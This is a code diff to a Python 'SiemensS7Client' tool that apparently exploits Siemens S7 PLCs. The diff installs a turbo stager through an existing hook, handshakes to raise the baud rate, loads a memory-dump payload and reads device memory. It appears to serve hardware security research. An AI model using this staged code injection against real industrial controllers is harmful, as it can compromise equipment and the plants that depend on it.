@@ -264,8 +264,37 @@ class SiemensS7Client:
         payload = args.payload.read() if hasattr(args, 'payload') and args.payload else None
 
         if args.action == ACTION_DUMP_TURBO:
-            if not self.switch_to_turbo_mode(): return
-            if not self.load_payload_turbo(payload, self.next_payload_location): return
+            # Step 1: Install turbo_stager using the normal stager
+            # Use hook 0x19 for turbo_stager itself (not 0x1a, which turbo_stager will use for the final payload)
+            TURBO_STAGER_HOOK_IND = 0x19
+            turbo_stager_code = open(TURBO_STAGER_PL_FILENAME, 'rb').read()
+            turbo_stager_addhook_ind = self.install_addhook_via_stager(
+                self.next_payload_location, 
+                turbo_stager_code, 
+                stager_addhook_ind,
+                TURBO_STAGER_HOOK_IND
+            )
+            log.info("Turbo stager installed at hook 0x{:02x}".format(turbo_stager_addhook_ind))
+            
+            # Remember the destination address for the final payload
+            dump_payload_addr = self.next_payload_location
+            
+            # Step 2: Invoke turbo_stager - it will send 0xAA to initiate handshake
+            log.info("Invoking turbo stager to switch to turbo mode...")
+            self.invoke_add_hook(turbo_stager_addhook_ind, await_response=False)
+            
+            # Step 3: Respond to handshake from turbo_stager and switch baud rate
+            if not self.switch_to_turbo_mode(): 
+                self.bye()
+                return
+            
+            # Step 4: Send the dump_mem payload via turbo mode
+            # The turbo_stager will receive it, install it at hook 0x1a, and send 'D'
+            if not self.load_payload_turbo(payload, dump_payload_addr):
+                self.bye()
+                return
+            
+            # Step 5: Dump memory using the payload installed by turbo_stager at hook 0x1a
             log.info("Dumping memory...")
             contents = self.payload_dump_mem(args.address, args.length, DEFAULT_SECOND_ADD_HOOK_IND)
         else:
